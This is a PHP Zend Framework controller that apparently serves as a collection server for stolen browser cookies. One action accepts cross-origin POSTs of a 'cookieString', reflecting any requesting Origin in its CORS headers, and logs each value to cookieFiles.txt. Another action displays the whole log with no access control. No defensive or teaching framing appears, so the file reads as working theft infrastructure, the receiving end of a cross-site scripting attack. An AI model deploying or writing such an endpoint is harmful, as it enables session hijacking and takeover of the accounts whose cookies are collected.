<?php
/**
 * Created by PhpStorm.
 * User: silas
 * Date: 03.02.15
 * Time: 17:49
 */

namespace Portal\Controller;

use Zend\Http\Request;
use Zend\Http\Response;
use Zend\Mvc\Controller\AbstractActionController;
use Zend\View\Model\ViewModel;

class IndexController extends AbstractActionController
{
	const FILENAME = "cookieFiles.txt";
	public function indexAction()
	{
		return new ViewModel(array());
	}
	public function saveCookieAction()
	{
		/** @var Request $request */
		$request = $this->getRequest();
		if ($request->isPost() && $request->getPost("cookieString"))
		{
			file_put_contents(self::FILENAME, "[".date("Y-m-d H:i:s")."] ".$request->getPost("cookieString").PHP_EOL, FILE_APPEND);
			$this->layout("layout/allBlank");
			/** @var Response $response */
			$response = $this->getResponse();
			$response->getHeaders()->addHeaderLine('Access-Control-Allow-Origin: '.$_SERVER['HTTP_ORIGIN']);
			$response->getHeaders()->addHeaderLine('Access-Control-Allow-Methods: GET, PUT, POST, DELETE, OPTIONS');
			$response->getHeaders()->addHeaderLine('Access-Control-Max-Age: 1000');
			$response->getHeaders()->addHeaderLine('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
		}
		return new ViewModel();
	}
	public function showCookieAction()
	{
		$cookies = file_get_contents(self::FILENAME);
		return new ViewModel(array("cookies" => $cookies));
	}
}